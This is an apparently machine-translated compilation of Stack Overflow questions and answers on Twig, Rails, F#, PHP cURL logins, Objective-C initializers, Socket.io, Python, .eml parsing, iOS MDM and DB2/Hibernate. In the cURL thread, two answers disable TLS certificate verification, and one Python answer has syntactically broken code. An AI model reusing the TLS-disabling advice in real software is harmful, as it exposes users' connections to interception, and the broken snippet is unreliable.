这个问题在关于[日期函数的树枝文档中得到了解释](http://twig.sensiolabs.org/doc/functions/date.html)

```
{% if date(mydate) > date('-2 years') %}
    OK
{% else %}
    Less than 2 years old
{% endif %} 
```

# ruby-on-rails - 该命令的功能：exec rake assets:precompile

> ID：16013232
> 
> 赞同：0
> 
> 时间：2013-04-15T10:44:59.650
> 
> 标签：ruby-on-rails, ruby, rake

```
bundle exec rake assets:precompile 
```

任何人都知道这个命令在 ruby​​ on rails 中用于什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T10:49:47.080

您好，请参阅以下链接：

[http://guides.rubyonrails.org/asset_pipeline.html](http://guides.rubyonrails.org/asset_pipeline.html)

对于 Heroku ：

[https://devcenter.heroku.com/articles/rails-asset-pipeline](https://devcenter.heroku.com/articles/rails-asset-pipeline)

# webstorm - 在 Jetbrains-Webstorm 中，如何配置它以使我的所有 nodejs 文件都具有全局和 10.3 范围？

> ID：16013233
> 
> 赞同：1
> 
> 时间：2013-04-15T10:45:00.247
> 
> 标签：webstorm

编辑器不断警告我，他不理解“require”的含义以及 module.exports 的含义，我必须为我的项目中的每个 js 手动添加使用 10.3 和全局变量，这是一个巨大的麻烦。

如何将其设置为默认值？

# f# - 如何为 ProvidedMethod 生成咖喱参数？

> ID：16013234
> 
> 赞同：3
> 
> 时间：2013-04-15T10:45:00.070
> 
> 标签：f#, type-providers, f#-3.0

我想生成一个静态方法这个签名`A -> B -> C`

但我只能生成`A * B -> C`：

```
ProvidedMethod(name, [ ProvidedParameter("A", aType); ProvidedParameter("B", bType) ], cType, IsStaticMethod = true) 
```

我不能手动进行柯里化，因为函数类型在类型提供程序中不能正常工作，只能委托类型。有没有其他我不知道的方法可以做到这一点，或者这根本不支持？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-29T20:48:10.463

我怀疑您不能简单地使用 ProvidedMethod 进行柯里化。但是，您可以让您的方法返回一个包装参数应用程序的函数。

```
public Func<A, Func<B, C>> Curry<A, B, C>(Func<A, B, C> func)
{
   return a1 => a2 => func(a1, a2);
} 
```

上面在 C# 中给出的示例以更明确地显示类型，在类型提供程序中，这将类似于以下内容。

```
let retType = typeof<('a -> ('b -> 'c)>
let ftype = typeof<('a -> 'b -> 'c>
let method = ProvidedMethod(name, [ProvidedParameter("Func", ftype)], retType) 
```

我目前手头没有 F# 编译器（我在 iPad 上），但希望这是朝着正确方向的推动。

# php - CURL 登录和检索页面

> ID：16013237
> 
> 赞同：0
> 
> 时间：2013-04-15T10:45:08.953
> 
> 标签：php, curl, httpwebrequest, zen-cart

我正在尝试编写一个脚本，该脚本将允许我登录到在 zencart 上运行的站点的密码保护区域并以字符串形式获取 html。到目前为止，它下载了 HTML 页面，作为 .html 文件，但只是页面的公共版本（即它没有成功登录）。它是 HTTPS，我相信这可能是它无法正常工作的部分原因。我的脚本有什么问题我需要什么 CURL 设置（遗憾的是，关于 PHP 的 CURL 的文档很少:(）

```
<?php
$username = "xxxx@gmail.com";
$password = "xxxxx";
$securityToken = "b6afe5babdd1b6be234d1976586fb1f1";
$loginUrl =  "https://www.xxxxxxx.com.au/index.php?main_page=login&action=process";

//init curl
$ch = curl_init();

//Set the URL to work with
curl_setopt($ch, CURLOPT_URL, $loginUrl);

// ENABLE HTTP POST
curl_setopt($ch, CURLOPT_POST, 1);

//Set the post parameters
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email_address='.$username.'&password='.$password.'&securityToken='.$securityToken);

//Handle cookies for the login
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie122.txt');

//Setting CURLOPT_RETURNTRANSFER variable to 1 will force cURL
//not to print out the results of its query.
//Instead, it will return the results as a string return value
//from curl_exec() instead of the usual true/false.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

//execute the request (the login)
$store = curl_exec($ch);

//the login is now done and you can continue to get the
//protected content.

//set the URL to the protected file
curl_setopt($ch, CURLOPT_URL, 'http://www.xxxxxxx.com.au/index.php?main_page=product_info&products_id=1488');

//execute the request
$content = curl_exec($ch);

//save the data to disk
file_put_contents('test122.html', $content);

if(curl_error($ch)) {
$error = curl_error($ch);
echo $error;
}

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:54:44.373

完整的示例工作：

```
 $ch = curl_init($url);

    $headers = array();

    //post
    $post = 'a=b&d=c';
    $headers[] = 'Content-type: application/x-www-form-urlencoded;charset=utf-8';
    $headers[] = 'Content-Length: ' . strlen($post);

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 

    //if get
   // $headers[] = 'Content-type: charset=utf-8';   

   $headers[] = 'Connection: Keep-Alive';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);// Follow redirects
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);// Set referer on redirect
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);// Stop after x redirects
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);// Stop after x seconds

    //username and password (if any):
    curl_setopt($ch, CURLOPT_USERPWD, "$username:$password");
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);

    //https
    $https = strpos($url, "https://");
    if($https !== false){
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    } 

    $response = curl_exec($ch);
    curl_close($ch);

    echo($response); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:05:39.057

您必须按照一些步骤使用 https 站点登录

> 导出证书。

转到浏览器中的站点（在我的示例中为 FF）。双击“锁定”图标 > 安全 > 查看证书 > 详细信息 > 导出。另存为 X.509。

> 将其上传到您的脚本可以看到的位置。
> 
> 然后加

```
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_CAINFO, getcwd() . "/path/to/certificateCA.crt"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:48:53.660

尝试单独的 url 和数据。使用 http_build_query()。

```
$loginUrl =  "https://www.xxxxxxx.com.au/index.php";
...
$args = array(
  'main_page'     => 'login',
  'action'        => 'process',
  'email_address' => $username,
  'password'      => $password,
  'securityToken' => $securityToken
);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($args)); 
```

你可能需要：

```
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
```

并且可能有用：

```
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
```

# ios - 无法从 init 系列中的方法分配给 self？

> ID：16013238
> 
> 赞同：24
> 
> 时间：2013-04-15T10:45:12.907
> 
> 标签：ios, objective-c

我正在使用 self like " `self = [super init];`"，下面的代码给我一个错误 " `cannot assign to self out of a method in the init family`"

```
- (id)showDropDown:(UIButton *)b:(CGFloat *)height:(NSArray *)arr:(NSString *)direction {
    btnSender = b;
    animationDirection = direction;
    self = [super init];
    if (self) {
        // Initialization code
        CGRect btn = b.frame;
        self.list = [NSArray arrayWithArray:arr];

        if ([direction isEqualToString:@"up"]) {
            self.frame = CGRectMake(btn.origin.x, btn.origin.y, btn.size.width, 0);
            self.layer.shadowOffset = CGSizeMake(-5, -5);
        }else if ([direction isEqualToString:@"down"]) {
            self.frame = CGRectMake(btn.origin.x, btn.origin.y+btn.size.height, btn.size.width, 0);
            self.layer.shadowOffset = CGSizeMake(-5, 5);
        }

        self.layer.masksToBounds = NO;
        self.layer.cornerRadius = 8;
        self.layer.shadowRadius = 5;
        self.layer.shadowOpacity = 0.5;

        table = [[UITableView alloc] initWithFrame:CGRectMake(0, 0, btn.size.width, 0)];
        table.delegate = self;
        table.dataSource = self;
        table.layer.cornerRadius = 5;
        table.backgroundColor = [UIColor colorWithRed:0.239 green:0.239 blue:0.239 alpha:1];
        table.separatorStyle = UITableViewCellSeparatorStyleSingleLine;
        table.separatorColor = [UIColor grayColor];

        [UIView beginAnimations:nil context:nil];
        [UIView setAnimationDuration:0.5];
        if ([direction isEqualToString:@"up"]) {
            self.frame = CGRectMake(btn.origin.x, btn.origin.y-*height, btn.size.width, *height);
        } else if([direction isEqualToString:@"down"]) {
            self.frame = CGRectMake(btn.origin.x, btn.origin.y+btn.size.height, btn.size.width, *height);
        }
        table.frame = CGRectMake(0, 0, btn.size.width, *height);
        [UIView commitAnimations];

        [b.superview addSubview:self];
        [self addSubview:table];
    }
    return self;
} 
```

错误：

```
 Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Requesting the window of a view (<NIDropDown: 0x684ac50; frame = (0 0; 0 0); transform = [0, 0, 0, 0, 0, 0]; alpha = 0; opaque = NO; layer = (null)>) with a nil layer. This view probably hasn't received initWithFrame: or initWithCoder:. 
```

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2013-04-15T10:56:13.100

If your method is an initializer, it must start with `init`:

`- (instancetype)initWithDropDown:(UIButton *)b:(CGFloat *)height:(NSArray *)arr:(NSString *)direction`

Otherwise, you can change it to be a class method, and return a new instance:

```
+ (instancetype)showDropDown:(UIButton *)b:(CGFloat *)height:(NSArray *)arr:(NSString *)direction
{
    btnSender = b;
    animationDirection = direction;
    YourClassName obj = [[self alloc] init];
    if (obj) {
        // Initialization code
        // …
    }
    return obj;
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-15T11:21:04.043

You can't initialize `self` outside an `init` method because of the following [convention](https://developer.apple.com/library/ios/#documentation/General/Conceptual/DevPedia-CocoaCore/ObjectCreation.html#//apple_ref/doc/uid/TP40008195-CH39-SW1):

> If an object’s class does not implement an initializer, the Objective-C runtime invokes the initializer of the nearest ancestor instead.

and because the name of some methods is recognized by the memory management system of the runtime:

> When the name of a method starts with alloc init, retain, or copy, it means it's being created for the caller, who has the responsibility to release the object when he is done with it. Otherwise the method returned is not owned by the caller, and he has to indicate he wants to keep it calling retain on the object.

Therefore, all initializers should be written as a variation of this:

```
- (id) init {
    self = [super init];
    if (self){
        _someVariable = @"someValue";
    }
    return self;
} 
```

*   Don't use `if ((self = [super init]))` because it's ugly.
*   Don't use `self.someVariable` because the object may not be initialized yet. Use direct variable access instead (`_someVariable`).
*   We write `self = [super init]` and not just `[super init]` because a different instance may be returned.
*   We write `if (self)` because there will be cases where it will return `nil`.

However, there are two more problems with your method:

*   You are combining object creation (`[super init]`) and an action (`-showDropDown::::`) in the same method. You should write two separate methods instead.
*   The name of your method is `-showDropDown::::`. Objective-C programmers expect self documenting method names like `-showDropDown:height:array:direction:` instead. I guess you come from a different language, but *when in Rome, do as Romans do*, or else you won't be playing along with the rest of the team.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-03-22T06:57:28.287

Check your spelling in this method

```
-(id)initwithArray:(NSArray *)array 
```

Code: (Objective-C)

```
-(id)initWithArray:(NSArray *)array 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-15T10:55:03.683

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-11-25T12:30:38.337

Just in case if someone made mistake similar to me, It might be helpful. Please change `-(void)` to `-(id)`. You need to make sure that you are returning an `id`.If you use `-(void)` for both **declaration** and **definition** of **initialiser**, compiler will give you same error as mentioned in question, without telling you to change return type.

# objective-c - UINavigationBar 在 ViewController 启动时出现

> ID：16013239
> 
> 赞同：0
> 
> 时间：2013-04-15T10:45:17.413
> 
> 标签：objective-c, uinavigationcontroller

我有一个隐藏导航栏的主 UIViewController。

但是，当我以模态方式呈现视图时，当我的新 ViewController 向上滑动时，导航栏会在新 View Controller 占据整个屏幕之前短暂出现在 Main 上。

```
[self presentViewController:settingsController animated:YES completion:nil]; 
```

有没有人发生过这种情况并知道可能是什么原因造成的？我希望导航栏保持隐藏状态。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T12:18:56.963

如果你已经完成了；

```
- (void)viewWillDisappear:(BOOL)animated
{
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    [super viewWillDisappear:animated];
} 
```

然后你会得到那个（副作用）效果。尝试评论第一行。让我知道它是否有效。

# node.js - 无法在翡翠客户端加载已安装的模块

> ID：16013240
> 
> 赞同：0
> 
> 时间：2013-04-15T10:45:29.797
> 
> 标签：node.js, express, pug

谁能指出为什么在客户端加载***socket.io模块时出现 404 错误？***我认为我在 layout.jade 文件中调用 socket.io 模块的方式有问题。

**脚本（类型='文本/javascript'，src='../socket.io/socket.io.js'）**

这是一个基本的快速应用程序，它使用**Socket.io**模块创建一个网络套接字。当我使用客户端（使用 Jade 模板引擎）连接到 Web 套接字时，它会抛出 -

```
GET http://localhost:3000/socket.io/socket.io.js 404 (Not Found) 
```

这里是我的 layout.jade、index.jade 和 app.js 的内容。

**布局.jade**

```
doctype 5
html
head
title= title
script(src='http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js')       
script(type='text/javascript', src='/javascripts/flot/jquery.js')
script(type='text/javascript', src='/javascripts/flot/jquery.flot.js')      
script(type='text/javascript', src='../socket.io/socket.io.js') //script(src='http://'+ domain + ':3000/socket.io/socket.io.js')    
link(rel='stylesheet', href='/stylesheets/style.css')
body
block content' 
```

**索引.jade**

```
extends layout
block content
h1= title
p Welcome to #{title} 
```

**索引.js**

```
exports.index = function(req, res){  
res.render('index', { title: 'Temperature Monitor',domain: 'localhost'  });
}; 
```

**应用程序.js**

```
var express = require('express'),
routes = require('./routes'),
user = require('./routes/user'),
http = require('http'),
path = require('path');

var app = express();
var httpServer = http.createServer(app);
var io = require('socket.io').listen(httpServer);

app.configure(function(){
app.set('port', process.env.PORT || 3000);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
app.use(express.favicon());
app.use(express.logger('dev'));
app.use(express.bodyParser());
app.use(express.methodOverride());
app.use(app.router);
app.use(express.static(path.join(__dirname, 'public')));
});

app.configure('development', function(){
app.use(express.errorHandler());
});

app.get('/', routes.index);
app.get('/users', user.list);

http.createServer(app).listen(app.get('port'), function(){
      console.log("Express server listening on port " + app.get('port'));
});

io.sockets.on('connection', function(socket) {
    socket.emit('welcome', {'salutation':'TMP36 Sensor output!'});      
});' 
```

我运行以下命令来创建应用程序。

```
express homeAutomation
cd homeAutomation
npm install
node app.js 
```

我的文件夹结构的详细信息 -

```
HomeAutomation
  ->node_modules
    ->express
    ->jade
    ->socket.io    
  ->public
    ->routes
  ->views
    ->index.jade
    ->layout.jade
  App.js 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:45:55.050

您的**app.js**文件有一些错误的代码。修改如下。

```
 var express = require('express'),
    routes = require('./routes'),
    user = require('./routes/user'),
    http = require('http'),
    path = require('path');

    var app = express();

    app.configure(function(){
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    app.use(express.favicon());
    app.use(express.logger('dev'));
    app.use(express.bodyParser());
    app.use(express.methodOverride());
    app.use(app.router);
    app.use(express.static(path.join(__dirname, 'public')));
    });

    app.configure('development', function(){
    app.use(express.errorHandler());
    });

    app.get('/', routes.index);
    app.get('/users', user.list);

   var httpServer = http.createServer(app).listen(app.get('port'), function(){
    console.log("Express server listening on port " + app.get('port'));
   });

    var io = require('socket.io').listen(httpServer);
    io.sockets.on('connection', function(socket) {
        socket.emit('welcome', {'salutation':'TMP36 Sensor output!'});      
    }); 
```

# python - 带整数的 type() 函数？

> ID：16013249
> 
> 赞同：-1
> 
> 时间：2013-04-15T10:45:50.497
> 
> 标签：python, python-2.7

我一直在编写代码，其中一部分给我带来了很多麻烦。就是这个。

```
import math
number=raw_input("Enter the number you wish to find its square root: ")
word=number
if type(word)==type(int):
    print sqrt(word) 
```

在 IDLE 中，每当我输入一个数字时，都不会打印任何内容。我在编辑器中检查了语法错误和缩进，并修复了所有这些错误。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T10:47:16.907

您正在寻找`isinstance()`：

```
if isinstance(word, int): 
```

但这不起作用，因为`raw_input()`返回一个*字符串*。您可能需要异常处理：

```
try:
    word = int(word)
except ValueError:
    print 'not a number!'
else:
    print sqrt(word) 
```

对于您的特定错误，`type(word) is int`可能也可以，但这不是很pythonic。`type(int)`返回类型的`int`类型，即`<type 'type'>`：

```
>>> type(42)
<type 'int'>
>>> type(42) is int
True
>>> type(int)
<type 'type'>
>>> type(int) is type
True 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T10:55:03.593

raw_input 返回一个字符串。您需要将输入转换为数字

```
in_string = raw_input("...")
try:
    number = float(in_string)
    print math.sqrt(number)
except ValueError as e:
    print "Sorry, {} is not a number".format(in_string) 
```

# c# - 从 .EML 文件中检索电子邮件信息

> ID：16013254
> 
> 赞同：6
> 
> 时间：2013-04-15T10:46:08.120
> 
> 标签：c#, email, sharepoint

我有一个 .eml 文件。我想做的是从此 .eml 文件中检索发件人、收件人、主题、正文和附件（如果有）并保存到数据库。我需要在 C# 中做到这一点，并且没有任何第三方应用程序。

我搜索了一些源代码，但找不到任何源代码，除了这个[.net 中是否可以读取.eml 文件](https://stackoverflow.com/questions/1151155/is-it-possible-to-read-eml-files-in-net) 但是没有源代码，这更有帮助。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-15T10:50:26.850

**紧急**参考以下链接：

[http://www.codeproject.com/Articles/76607/Easily-Retrieve-Email-Information-from-EML-Files-R](http://www.codeproject.com/Articles/76607/Easily-Retrieve-Email-Information-from-EML-Files-R)

```
protected CDO.Message ReadMessage(String emlFileName)
{
    CDO.Message msg = new CDO.MessageClass();
    ADODB.Stream stream = new ADODB.StreamClass();
    stream.Open(Type.Missing, ADODB.ConnectModeEnum.adModeUnknown, ADODB.StreamOpenOptionsEnum.adOpenStreamUnspecified, String.Empty, String.Empty);
    stream.LoadFromFile(emlFileName);
    stream.Flush();
    msg.DataSource.OpenObject(stream, "_Stream");
    msg.DataSource.Save();
    return msg;
} 
```

您还可以从以下位置获得有关 elm 解析的帮助：

[http://blog.onderweg.eu/2010/12/parsing-eml-files-in-c/](http://blog.onderweg.eu/2010/12/parsing-eml-files-in-c/)

这也是有用的教程：

[http://www.emailarchitect.net/eagetmail/kb/csharp.aspx?cat=18](http://www.emailarchitect.net/eagetmail/kb/csharp.aspx?cat=18)

# python - 使用正则表达式在 Python 中解析大文本文件

> ID：16013255
> 
> 赞同：0
> 
> 时间：2013-04-15T10:46:11.200
> 
> 标签：python, regex

如何在大文本文件中存储从某个单词开始并以某个单词结尾的文本数据（使用 python 和正则表达式）。

这是文本文件的一部分：

```
X_FUNCTION = linear
TITLE =
netlist_run
Vnet04  YUNITS = volts
+  0.000000000000000E+00 -4.000000000000000E-01  3.636363636363636E-02 -4.000000000000000E-01
+  7.272727272727272E-02 -4.000000000000000E-01  1.090909090909091E-01 -4.000000000000000E-01
+  1.454545454545454E-01 -4.000000000000000E-01  1.818181818181818E-01 -4.000000000000000E-01
+  2.181818181818182E-01 -4.000000000000000E-01  2.545454545454546E-01 -4.000000000000000E-01
+  2.909090909090910E-01 -4.000000000000000E-01  3.272727272727273E-01 -4.000000000000000E-01
Vnet05  YUNITS = volts
+  0.000000000000000E+00  3.000000000000000E+00  3.636363636363636E-02  3.000000000000000E+00
+  7.272727272727272E-02  3.000000000000000E+00  1.090909090909091E-01  3.000000000000000E+00
+  1.454545454545454E-01  3.000000000000000E+00  1.818181818181818E-01  3.000000000000000E+00
+  2.181818181818182E-01  3.000000000000000E+00  2.545454545454546E-01  3.000000000000000E+00
+  2.909090909090910E-01  3.000000000000000E+00  3.272727272727273E-01  3.000000000000000E+00
vbs_i  YUNITS = amps
+  0.000000000000000E+00  3.881535006369462E-12  3.636363636363636E-02  3.958355883215995E-12
+  7.272727272727272E-02  4.155732392087960E-12  1.090909090909091E-01  4.661608907762973E-12
+  1.454545454545454E-01  5.953136322408749E-12  1.818181818181818E-01  9.230381781895836E-12
+  2.181818181818182E-01  1.746801289794467E-11  2.545454545454546E-01  3.787865538450135E-11
+  2.909090909090910E-01  8.739483655864867E-11  3.272727272727273E-01  2.040272699537106E-10 
```

我想开始保存从行开始`Vnet04 YUNITS = volts`直到对象中行开始之前的数据，`Vnet05 YUNITS = volts`比如说`a`。然后我想再次保存从行开始直到对象`Vnet05 YUNITS = volts`中行开始之前的数据`vbs_i YUNITS = amps``b`

因为我的文本文件超过 1000k 行。我只想解析一次。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:40:32.417

1）为您的“开始”和“停止”行编写一个正则表达式匹配

请参阅[http://docs.python.org/2/library/re.html#examples](http://docs.python.org/2/library/re.html#examples) 正如评论者所提到的，您可能不需要正则表达式来执行此操作

2）逐行读取行并与开始和停止行进行比较，使用它来设置状态变量true或false

3) 如果状态变量为真，则使用 append 将行添加到数组中

在文件的末尾，您应该在数组中有感兴趣的行

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T12:09:02.283

这是代码：

```
#!/usr/bin/env python3

import re

ins = open( "test.txt", "r" )
array = []
array2 = []
i = 0
for line in ins:
    if ((re.match('Vnet05 YUNITS = volts) or re.match('vbs_i YUNITS = amps')) and (i != 0 ):
        array.append(array2)
        i += 1
        array2 = []
        array2.append( line )
    elif line.startswith('+') :
        i += 1
        array2.append(line)

array.append(array2)
for line in array:
    print("Object :")
    print(line) 
```

# ios - iOS ipa无人值守安装没有弹出窗口？（通过 ota mdm 推送）

> ID：16013258
> 
> 赞同：1
> 
> 时间：2013-04-15T10:46:15.953
> 
> 标签：ios, mdm

我有一个工作的定制 mdm 服务器，注册的 iPad 可以正确响应推送的命令。

我目前使用该命令在这些设备上部署 .ipa 应用程序`InstallApplication`，但是，每次设备都会显示一个弹出窗口，要求在安装/更新应用程序之前进行确认。

我目前要求有效载荷`AccessRight`中的最高可用（8191） 。`com.apple.mdm`

我听说在没有此弹出窗口的情况下以某种方式执行真正的无人值守安装是可能的？这是真的吗？它是否需要配置器（在我的情况下不能是一个选项，100% ota）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T15:49:02.617

我从未听说过通过 iOS 上的 MDM 安装无人值守（静默）的应用程序。

根据 MDM 文档，它将始终请求用户批准 InstallApplication 命令。

关于苹果配置器。您可以使设备受监督并在其上安装 MDM 配置文件。这样，初始配置应通过系绳完成，但您可以通过 MDM 进行任何后续配置。我对此表示怀疑，但对于 InstallApplication 命令，受监督设备的行为可能有所不同（不需要用户接受）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-25T14:47:32.213

这现在可用于装有 iOS 7 的 MDM。

您的 MDM 软件可能需要一段时间才能实现该功能并为您提供。在撰写本文时，我正在“为未来的版本而努力”。

# db2 - db2 count(*) 使用休眠条件排序

> ID：16013260
> 
> 赞同：0
> 
> 时间：2013-04-15T10:46:18.403
> 
> 标签：db2, hibernate3

我试过这段代码：

```
List resultList = new ArrayList();
Criteria criteria = createCriteria(SystemLogFile.class);
criteria.add(Expression.eq("clientId", clientId));
criteria.addOrder(Order.desc("systemLogFileId"));
if (page == -1) {
  resultList.add(criteria.setProjection(Projections.rowCount()).uniqueResult());
} else {
  criteria.setFirstResult(page * pageSize);
  criteria.setMaxResults(pageSize);
  resultList = criteria.list();
  setModelsListAsLoaded(resultList);
}
return resultList; 
```

此代码生成以下查询：

```
select count(*) as y0_ from krn_system_log_file this_ where this_.CLIENT_ID=? order by this_.SYSTEM_LOG_FILE_ID desc 
```

这适用于 oracle 和 mysql，但不适用于 db2！我收到此错误消息： 引起：com.ibm.db2.jcc.am.io：DB2 SQL 错误：SQLCODE=-119，SQLSTATE=42803，SQLERRMC=SYSTEM_LOG_FILE_ID，DRIVER=3.57.82

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T17:15:38.287

[SQL 代码 -119](http://publib.boulder.ibm.com/infocenter/db2luw/v9r7/topic/com.ibm.db2.luw.messages.sql.doc/doc/msql00119n.html)表示：

> 在 SELECT 子句、HAVING 子句或 ORDER BY 子句中指定的以*expression-start*开头的表达式未在 GROUP BY 子句中指定，或者它位于具有列函数但没有 GROUP 的 SELECT 子句、HAVING 子句或 ORDER BY 子句中指定了 BY 子句。

在 DB2 中，如果您想要 order by `this_.SYSTEM_LOG_FILE_ID`，那么它必须在`GROUP BY`子句中。我不使用 Hibernate，但是您可以将其添加`GROUP BY`到您的`criteria`对象中吗？

# html - 相对寻址

> ID：16013262
> 
> 赞同：0
> 
> 时间：2013-04-15T10:46:21.920
> 
> 标签：html, apache, url, relative-path

我开发了一个网站，其中包含每个主题（管理员、联系人、消息）的文件夹。根目录包含一个文件，我用作菜单栏并在每个页面上呈现。每当我从一个页面导航到另一个文件夹中的另一个页面时，Apache 都会将前一个文件夹的文件夹名称添加到当前文件夹中。例如。如果我在页面 /Admin/Test.hml 并移动到 Contact.html 恰好位于 Contact 文件夹中，则 url 变为 /Admin/Contact/Contact.html 而不是 /Contact/Contact.html 我怎样才能防止这种情况?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:48:48.837

这是相对路径和绝对路径的问题。看看这篇不错的文章：[http](http://www.uvsc.edu/disted/decourses/dgm/2120/IN/steinja/lessons/06/06_04.html) ://www.uvsc.edu/disted/decourses/dgm/2120/IN/steinja/lessons/06/06_04.html 或这篇 [http://kb.worldsecuresystems.com/ 165/bc_1653.html](http://kb.worldsecuresystems.com/165/bc_1653.html)

# android - 仅当不存在对另一个 void 的调用时才调用 onPostExecute

> ID：16013263
> 
> 赞同：0
> 
> 时间：2013-04-15T10:46:22.873
> 
> 标签：android, android-asynctask, void

我有以下`onPostExecute`代码`AsyncTask`。它按原样运行良好。但是，当我删除注释的代码时，我从未收到过`onPostExecute`事件（没有 Toast）。

```
@Override
protected void onPostExecute(String result) {
      internetData = result;        
      tempview.append(result + "\n");
      Toast.makeText(getApplicationContext(), internetData.toString(), 1).show();
      //setServiceId();
} 
```

该`setServiceId`事件和后续事件是（故意删除 URL），`GetXMLData`是我的`AsyncTask`：

```
public void setServiceId() {
    if (internetData != null) {
        try {
            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();

            xpp.setInput(new StringReader(internetData));
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if (eventType == XmlPullParser.TEXT) {
                    serviceId = xpp.getText();
                    serviceHistory = "www.google.com/" + serviceId + "/history";
                    serviceUsage = "www.google.com/" + serviceId + "/usage";
                    serviceDetails = "www.google.com/" + serviceId + "/service";
                    Toast.makeText(getApplicationContext(), serviceId, 1).show();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    updateHistory();
    updateDetails();
    updateUsage();
}

public void updateHistory() { //Never called
    new GetXMLData().execute(serviceHistory);
    Toast.makeText(getApplicationContext(), "Update History", 1).show();
}

public void updateUsage() { //Never called
    new GetXMLData().execute(serviceUsage);
    Toast.makeText(getApplicationContext(), "Update Usage", 1).show();
}

public void updateDetails() { //Never called
    new GetXMLData().execute(serviceDetails);
    Toast.makeText(getApplicationContext(), "Update Details", 1).show();
}

    public void updateData() { //First call
    new GetXMLData().execute(serviceListing);
    Toast.makeText(getApplicationContext(), "Update Data", 1).show();
} 
```

上面的最后一个事件`updateData`被调用，当事件没有被注释掉`Toast`时，似乎永远不会消失。`setServiceId`除此之外，不会检索 XML 数据。

当它被注释掉时，我收到了`updateData()`事件的 XML 数据，但没有后续事件，而且我没有得到`Toast`from `onPostExecute`。关于为什么会发生这种情况的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:42:23.693

您实际上在 while 循环条件中有一个错误，它将无限循环并使您的应用程序挂起：

```
 while (eventType != XmlPullParser.END_DOCUMENT) {
        if (eventType == XmlPullParser.TEXT) {
            serviceId = xpp.getText();
            serviceHistory = "www.google.com/" + serviceId + "/history";
            serviceUsage = "www.google.com/" + serviceId + "/usage";
            serviceDetails = "www.google.com/" + serviceId + "/service";
            Toast.makeText(getApplicationContext(), serviceId, 1).show();
        }
    } 
```

在循环中添加下一行：

```
 eventType = xpp.next(); 
```

# c# - ajax 对象服务器数据提取

> ID：16013265
> 
> 赞同：0
> 
> 时间：2013-04-15T10:46:33.137
> 
> 标签：c#, ajax

目前，我正在将此代码添加到发布数据的帖子中，我如何能够将这些数据不作为对象而是单独的字符串发布到服务器。或者我将如何使用 c# 在对象中调用这些数据

```
var ajaxData = {
                   'Id': document.getElementsByName("Id").value,
                   'ClientId': document.getElementsByName("ClientId").value,
                   'GAUserName': document.getElementsByName("GAUserName").value,
                   'GAPassword': document.getElementsByName("GAPassword").value,
                   'Email': document.getElementsByName("Email").value,
                   'Profiles': document.getElementsByName("Profiles").value,
                   'AppKey ': document.getElementsByName("AppKey").value,
                   'SchTime': document.getElementsByName("SchTime").value,
                   'IsActive': document.getElementsByName("IsActive").value

               };

               $.ajax({
                   url: postUrl,
                   type: 'POST',
                   data: ajaxData,
                   success: function (data, textStatus, jqXHR) {
                       alert('Data has been chnaged');
                   }
               }); 
```

# r - R代码做一个散点图矩阵

> ID：16013268
> 
> 赞同：-5
> 
> 时间：2013-04-15T09:46:44.277
> 
> 标签：r

我有以下一组数据：

```
pcb138  pcb180  pcb52   pcb118  pcb

1,46    ,738    ,532    ,72 19,9959
,64 ,664    ,03 ,236    6,0996
3,29    1,15    ,134    1,54    24,9655
3,94    1,33    ,466    1,94    37,4436
3,18    2,14    ,243    1,47    30,183
2,43    1,3 ,137    1,31    20,8036
3,94    3,49    ,208    ,876    41,3818
